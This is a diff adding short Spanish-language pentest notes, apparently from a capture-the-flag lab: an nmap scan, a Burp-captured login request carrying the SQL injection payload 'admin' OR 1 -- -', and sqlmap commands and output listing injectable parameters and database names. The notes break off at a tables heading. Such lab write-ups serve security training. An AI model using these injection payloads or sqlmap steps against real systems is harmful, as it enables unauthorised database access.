@@ -1,0 +1,49 @@
+10.10.11.116
+ttl 63
+
+[+]NMAP[+]
+PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+4566/tcp open  kwtc
+8080/tcp open  http-proxy
+
+
+
+[+]BURPSUITE[+]
+http://10.10.11.116/index.php
+
+- Interceptamos la peticion para manipular los siguientes campos;
+  username : 
+  country :
+
+username=admin' OR 1 -- -&country=Albania
+- Guardamos desde HTTP history esa peticion modificado >> validation.req
+
+
+[+]SQLI-SQLMAP[+]
+
+- Trabajamos con esa misma peticion (validation.req) para comprobar si alguno de los campos son vulnerables (previamente ya teniamos cookie de sesion),
+  Con esto podremos obtener base de datos(Apunte: Desde nmap no habia ningun puerto abierto sobre mysql pero la pagina web almacenaba mis datos y eso efectivamente acaba en una base de datos..)
+  
+[+] sqlmap -r validation.req --dbs
+- Tras usar la herramienta podemos ver todas las posibles vulnerabilidades a explotar;
+
+[INFO] POST parameter 'country' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
+POST parameter 'country' is vulnerable.
+[INFO] POST parameter 'country' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
+it looks like the back-end DBMS is 'MySQL'
+[INFO] POST parameter 'country' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable 
+[INFO] POST parameter 'username' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable
+[INFO] heuristic (XSS) test shows that POST parameter 'username' might be vulnerable to cross-site scripting (XSS) attacks
+
+[+]DataBase Info
+[21:13:27] [INFO] fetching database names
+available databases [5]:
+[*] information_schema
+[*] mysql
+[*] performance_schema
+[*] registration
+
+
+[+]Tables Info
